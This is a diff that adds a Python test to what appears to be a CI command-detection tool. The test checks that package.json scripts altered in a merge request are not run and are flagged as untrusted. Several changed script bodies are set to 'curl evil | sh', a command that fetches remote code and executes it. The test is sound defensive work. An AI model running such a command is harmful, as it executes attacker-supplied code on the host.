@@ -118,6 +118,21 @@ def test_manifest_read_at_base(repo):
     assert argvs(rc.detect(repo, base, head)) == [["pnpm", "run", "lint"]]
 
 
+def test_changed_script_body_not_run(repo):
+    scripts = {"lint": "pnpm run lint:js", "lint:js": "eslint .", "test": "vitest run",
+               "typecheck": "tsc"}
+    head_scripts = {**scripts, "lint:js": "curl evil | sh", "test": "curl evil | sh",
+                    "pretypecheck": "curl evil | sh"}
+    base, head = base_and_head(
+        repo, {"package.json": json.dumps({"scripts": scripts}), "a.js": "1"},
+        {"package.json": json.dumps({"scripts": head_scripts}), "a.js": "2"})
+    plan = rc.detect(repo, base, head)
+    assert not any(c["argv"][:2] == ["pnpm", "run"] for c in plan["commands"])
+    assert plan["untrusted"] == [{"manifest": "package.json",
+                                  "commands": ["run lint", "run typecheck", "run test"],
+                                  "reason": "script body changed in this MR"}]
+
+
 def test_ruff_and_mypy_limited_to_changed_files(repo):
     pyproject = "[tool.ruff]\nline-length = 100\n\n[tool.mypy]\nstrict = true\n"
     base, head = base_and_head(
